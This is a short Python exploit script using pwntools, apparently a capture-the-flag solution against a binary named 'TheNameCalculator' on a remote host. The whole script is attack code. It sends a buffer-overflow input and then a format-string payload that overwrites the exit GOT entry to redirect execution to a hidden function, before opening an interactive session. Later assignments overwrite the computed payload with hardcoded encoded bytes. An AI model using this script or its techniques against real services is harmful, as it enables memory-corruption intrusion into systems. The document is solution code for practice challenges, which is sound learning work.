from pwn import *
from libformatstr import FormatStr
context(terminal = ['terminator', '-x', 'sh', '-c'], os = 'linux', log_level = 'debug')

# p = process("./TheNameCalculator")
p = remote('18.223.150.0',5678)
elf = ELF("./TheNameCalculator")
exit_got = elf.got['exit']
flag = elf.symbols['superSecretFunc']


p.recv()
p.send("A"*28 + p32(0x6a4b825))
p.recv()

p1 = FormatStr()
p1[exit_got] = flag
pay = p1.payload(12,0,0)
pay = "\x24\xa0\x04\x08%34194x%12$hnAAAAAAAA"
#pay = "w\xb2m>\x10\x962>\x13\x05\x02\x07\x0f\x06U\x13\x07\x04\x12X\x13\x05\x05V\x1do"
pay = "w\xb2m>\x13\x05\x02\x07\x0f\x02N\x13\x07\x04\x12^Xwwww$e\x01"
p.send(pay)
p.interactive()